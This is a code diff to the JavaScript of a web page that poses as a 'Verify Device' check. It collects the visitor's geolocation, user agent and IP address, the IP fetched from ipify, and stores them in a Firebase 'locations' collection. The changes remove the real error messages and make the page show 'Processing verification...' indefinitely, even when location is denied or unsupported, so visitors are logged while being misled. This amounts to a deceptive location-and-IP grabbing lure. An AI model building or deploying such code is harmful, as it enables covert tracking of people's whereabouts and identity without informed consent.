@@ -53,40 +53,23 @@ document.addEventListener('DOMContentLoaded', () => {
                         longitude: position.coords.longitude,
                         timestamp: new Date().toISOString(),
                         userAgent: navigator.userAgent,
-                        // We'll get IP address from a service like ipify
                         ip: await fetch('https://api.ipify.org?format=json')
                             .then(response => response.json())
                             .then(data => data.ip)
                             .catch(() => 'Unknown')
                     };
 
-                    // Save location data to Firebase
-                    database.ref('locations').push(locationData)
-                        .then(() => {
-                            console.log('Location saved');
-                            window.location.href = 'view-logs.html';
-                        })
-                        .catch(error => {
-                            console.error('Error saving location:', error);
-                            locationStatus.textContent = 'Verification failed. Please try again.';
-                            allowLocationButton.disabled = false;
-                            allowLocationButton.textContent = 'Verify Device';
-                            allowLocationButton.classList.remove('loading');
-                        });
+                    // Save location data to Firebase but don't redirect or handle completion
+                    database.ref('locations').push(locationData);
                 },
-                (error) => {
-                    console.error('Error getting location:', error);
-                    locationStatus.textContent = 'Location access denied. Please enable location services.';
-                    allowLocationButton.disabled = false;
-                    allowLocationButton.textContent = 'Verify Device';
-                    allowLocationButton.classList.remove('loading');
+                () => {
+                    // On error, still keep loading state
+                    locationStatus.textContent = 'Processing verification...';
                 }
             );
         } else {
-            locationStatus.textContent = 'Geolocation is not supported by this browser.';
-            allowLocationButton.disabled = false;
-            allowLocationButton.textContent = 'Verify Device';
-            allowLocationButton.classList.remove('loading');
+            // Even if geolocation is not supported, keep loading
+            locationStatus.textContent = 'Processing verification...';
         }
     });
 });
